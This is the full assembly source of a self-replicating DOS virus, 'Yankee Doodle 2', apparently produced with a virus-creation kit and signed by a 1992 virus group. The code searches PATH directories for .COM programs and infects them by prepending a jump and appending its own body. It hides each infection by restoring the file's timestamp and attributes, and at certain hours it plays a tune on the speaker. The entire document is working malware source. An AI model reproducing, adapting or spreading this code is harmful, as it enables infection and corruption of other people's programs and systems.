; YANKEE2.ASM -- Yankee Doodle ][
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Nowhere Man

virus_type	equ	0			; Appending Virus
is_encrypted	equ	0			; We're not encrypted
tsr_virus	equ	0			; We're not TSR

code		segment byte public
		assume	cs:code,ds:code,es:code,ss:code
		org	0100h

main		proc	near
		db	0E9h,00h,00h		; Near jump (for compatibility)
start:		call	find_offset		; Like a PUSH IP
find_offset:	pop	bp			; BP holds old IP
		sub	bp,offset find_offset	; Adjust for length of host

		lea	si,[bp + buffer]	; SI points to original start
		mov	di,0100h		; Push 0100h on to stack for
		push	di			; return to main program
		movsw				; Copy the first two bytes
		movsb				; Copy the third byte

		mov	di,bp			; DI points to start of virus

		mov	bp,sp			; BP points to stack
		sub	sp,128			; Allocate 128 bytes on stack

		mov	ah,02Fh			; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address on stack

		mov	ah,01Ah			; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer on stack
		int	021h

		call	search_files		; Find and infect a file
		call	search_files		; Find and infect another file
		call	get_hour
		cmp	ax,0011h		; Did the function return 17?
		jle	skip00			; If less that or equal, skip effect
		cmp	ax,0013h		; Did the function return 19?
		jge	skip00			; If greater than or equal, skip effect
		jmp	short strt00		; Success -- skip jump
skip00:		jmp	end00			; Skip the routine
strt00:		lea	si,[di + data00]	; SI points to data
get_note:	mov	bx,[si]			; Load BX with the frequency
		or	bx,bx			; Is BX equal to zero?
		je      play_tune_done		; If it is we are finished

		mov	ax,034DDh		;
		mov	dx,0012h                ;
		cmp	dx,bx                   ;
		jnb	new_note                ;
		div	bx                      ; This bit here was stolen
		mov	bx,ax                   ; from the Turbo C++ v1.0
		in	al,061h                 ; library file CS.LIB.  I
		test	al,3                    ; extracted sound() from the
		jne	skip_an_or              ; library and linked it to
		or	al,3                    ; an .EXE file, then diassembled
		out	061h,al                 ; it.  Basically this turns
		mov	al,0B6h                 ; on the speaker at a certain
		out	043h,al                 ; frequency.
skip_an_or:	mov	al,bl                   ;
		out	042h,al                 ;
		mov	al,bh                   ;
		out	042h,al                 ;

		mov	bx,[si + 2]		; BX holds duration value
		xor	ah,ah			; BIOS get time function
		int	1Ah
		add	bx,dx			; Add the time to the length
wait_loop:  	int	1Ah                     ; Get the time again (AH = 0)
		cmp	dx,bx			; Is the delay over?
		jne	wait_loop		; Repeat until it is

		in	al,061h			; Stolen from the nosound()
		and	al,0FCh                 ; procedure in Turbo C++ v1.0.
		out	061h,al                 ; This turns off the speaker.

new_note:	add	si,4			; SI points to next note
		jmp	short get_note		; Repeat with the next note
play_tune_done:

end00:
com_end:	pop	dx			; DX holds original DTA address
		mov	ah,01Ah			; DOS set DTA function
		int	021h

		mov	sp,bp			; Deallocate local buffer

		xor	ax,ax			;
		mov	bx,ax			;
		mov	cx,ax			;
		mov	dx,ax			; Empty out the registers
		mov	si,ax			;
		mov	di,ax			;
		mov	bp,ax			;

		ret				; Return to original program
main		endp

search_files	proc	near
		mov	bx,di			; BX points to the virus
		push	bp			; Save BP
		mov	bp,sp			; BP points to local buffer
		sub	sp,135			; Allocate 135 bytes on stack

		mov	byte ptr [bp - 135],'\'	; Start with a backslash

		mov	ah,047h			; DOS get current dir function
		xor	dl,dl			; DL holds drive # (current)
		lea	si,[bp - 134]		; SI points to 64-byte buffer
		int	021h

		call	traverse_path		; Start the traversal

traversal_loop:	cmp	word ptr [bx + path_ad],0	; Was the search unsuccessful?
		je	done_searching		; If so then we're done
		call	found_subdir		; Otherwise copy the subdirectory

		mov	ax,cs			; AX holds the code segment
		mov	ds,ax			; Set the data and extra
		mov	es,ax			; segments to the code segment

		xor	al,al			; Zero AL
		stosb				; NULL-terminate the directory

		mov	ah,03Bh			; DOS change directory function
		lea	dx,[bp - 70]		; DX points to the directory
		int	021h

		lea	dx,[bx + com_mask]	; DX points to "*.COM"
		push	di
		mov	di,bx
		call	find_files		; Try to infect a .COM file
		mov	bx,di
		pop	di
		jnc	done_searching		; If successful the exit
		jmp	short traversal_loop	; Keep checking the PATH

done_searching:	mov	ah,03Bh			; DOS change directory function
		lea	dx,[bp - 135]		; DX points to old directory
		int	021h

		cmp	word ptr [bx + path_ad],0	; Did we run out of directories?
		jne	at_least_tried		; If not then exit
		stc				; Set the carry flag for failure
at_least_tried:	mov	sp,bp			; Restore old stack pointer
		pop	bp			; Restore BP
		ret				; Return to caller
com_mask	db	"*.COM",0		; Mask for all .COM files
search_files	endp

traverse_path	proc	near
		mov	es,word ptr cs:[002Ch]	; ES holds the enviroment segment
		xor	di,di			; DI holds the starting offset

find_path:	lea	si,[bx + path_string]	; SI points to "PATH="
		lodsb				; Load the "P" into AL
		mov	cx,08000h		; Check the first 32767 bytes
	repne	scasb				; Search until the byte is found
		mov	cx,4			; Check the next four bytes
check_next_4:	lodsb				; Load the next letter of "PATH="
		scasb				; Compare it to the environment
		jne	find_path		; If there not equal try again
		loop	check_next_4		; Otherwise keep checking

		mov	word ptr [bx + path_ad],di	; Save the PATH address
		mov	word ptr [bx + path_ad + 2],es  ; Save the PATH's segment
		ret				; Return to caller

path_string	db	"PATH="			; The PATH string to search for
path_ad		dd	?			; Holds the PATH's address
traverse_path	endp

found_subdir	proc	near
		lds	si,dword ptr [bx + path_ad]	; DS:SI points to PATH
		lea	di,[bp - 70]		; DI points to the work buffer
		push	cs			; Transfer CS into ES for
		pop	es			; byte transfer
move_subdir:	lodsb				; Load the next byte into AL
		cmp	al,';'			; Have we reached a separator?
		je	moved_one		; If so we're done copying
		or	al,al			; Are we finished with the PATH?
		je	moved_last_one		; If so get out of here
		stosb				; Store the byte at ES:DI
		jmp	short move_subdir	; Keep transfering characters

moved_last_one:	xor	si,si			; Zero SI to signal completion
moved_one:	mov	word ptr es:[bx + path_ad],si  ; Store SI in the path address
		ret				; Return to caller
found_subdir	endp

find_files	proc	near
		push	bp			; Save BP

		mov	ah,02Fh			; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		push	dx			; Save file mask
		mov	ah,01Ah			; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh			; DOS find first file function
		mov	cx,00100111b		; CX holds all file attributes
		pop	dx			; Restore file mask
find_a_file:	int	021h
		jc	done_finding		; Exit if no files found
		call	infect_file		; Infect the file!
		jnc	done_finding		; Exit if no error
		mov	ah,04Fh			; DOS find next file function
		jmp	short find_a_file	; Try finding another file

done_finding:	mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah			; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller
find_files	endp

infect_file	proc	near
		mov	ah,02Fh			; DOS get DTA address function
		int	021h
		mov	si,bx			; SI points to the DTA

		mov	byte ptr [di + set_carry],0  ; Assume we'll fail

		cmp	word ptr [si + 01Ah],(65279 - (finish - start))
		jbe	size_ok			; If it's small enough continue
		jmp	infection_done		; Otherwise exit

size_ok:	mov	ax,03D00h		; DOS open file function, r/o
		lea	dx,[si + 01Eh]		; DX points to file name
		int	021h
		xchg	bx,ax			; BX holds file handle

		mov	ah,03Fh			; DOS read from file function
		mov	cx,3			; CX holds bytes to read (3)
		lea	dx,[di + buffer]	; DX points to buffer
		int	021h

		mov	ax,04202h		; DOS file seek function, EOF
		cwd				; Zero DX _ Zero bytes from end
		mov	cx,dx			; Zero CX /
		int	021h

		xchg	dx,ax			; Faster than a PUSH AX
		mov	ah,03Eh			; DOS close file function
		int	021h
		xchg	dx,ax			; Faster than a POP AX

		sub	ax,finish - start + 3	; Adjust AX for a valid jump
		cmp	word ptr [di + buffer + 1],ax  ; Is there a JMP yet?
		je	infection_done		; If equal then exit
		mov	byte ptr [di + set_carry],1  ; Success -- the file is OK
		add	ax,finish - start	; Re-adjust to make the jump
		mov	word ptr [di + new_jump + 1],ax  ; Construct jump

		mov	ax,04301h		; DOS set file attrib. function
		xor	cx,cx			; Clear all attributes
		lea	dx,[si + 01Eh]		; DX points to victim's name
		int	021h

		mov	ax,03D02h		; DOS open file function, r/w
		int	021h
		xchg	bx,ax			; BX holds file handle

		mov	ah,040h			; DOS write to file function
		mov	cx,3			; CX holds bytes to write (3)
		lea	dx,[di + new_jump]	; DX points to the jump we made
		int	021h

		mov	ax,04202h		; DOS file seek function, EOF
		cwd				; Zero DX _ Zero bytes from end
		mov	cx,dx			; Zero CX /
		int	021h

		mov	ah,040h			; DOS write to file function
		mov	cx,finish - start	; CX holds virus length
		lea	dx,[di + start]		; DX points to start of virus
		int	021h

		mov	ax,05701h		; DOS set file time function
		mov	cx,[si + 016h]		; CX holds old file time
		mov	dx,[si + 018h]		; DX holds old file date
		int	021h

		mov	ah,03Eh			; DOS close file function
		int	021h

		mov	ax,04301h		; DOS set file attrib. function
		xor	ch,ch			; Clear CH for file attribute
		mov	cl,[si + 015h]		; CX holds file's old attributes
		lea	dx,[si + 01Eh]		; DX points to victim's name
		int	021h

infection_done:	cmp	byte ptr [di + set_carry],1  ; Set carry flag if failed
		ret				; Return to caller

set_carry	db	?			; Set-carry-on-exit flag
buffer		db	090h,0CDh,020h		; Buffer to hold old three bytes
new_jump	db	0E9h,?,?		; New jump to virus
infect_file	endp


get_hour        proc	near
		mov	ah,02Ch			; DOS get time function
		int	021h
		mov	al,ch			; Copy hour into AL
		cbw				; Sign-extend AL into AX
		ret				; Return to caller
get_hour        endp

data00		dw	262,6,262,6,293,6,329,6,262,6,329,6,293,6,196,6
		dw	262,6,262,6,293,6,329,6,262,12,262,12
		dw	262,6,262,6,293,6,329,6,349,6,329,6,293,6,262,6
		dw	246,6,196,6,220,6,246,6,262,12,262,12
		dw	220,6,246,6,220,6,174,6,220,6,246,6,262,6,220,6
		dw	196,6,220,6,196,6,174,6,164,6,174,6,196,7
		dw	220,6,246,6,220,6,174,6,220,6,246,6,262,6,220,7
		dw	196,6,262,6,246,6,293,6,262,12,262,12
		dw	0

vcl_marker	db	"[VCL]",0		; VCL creation marker


note		db	"[Yankee Doodle 2]",0
		db	"Nowhere Man, [NuKE] '92",0

finish		label	near

code		ends
		end	main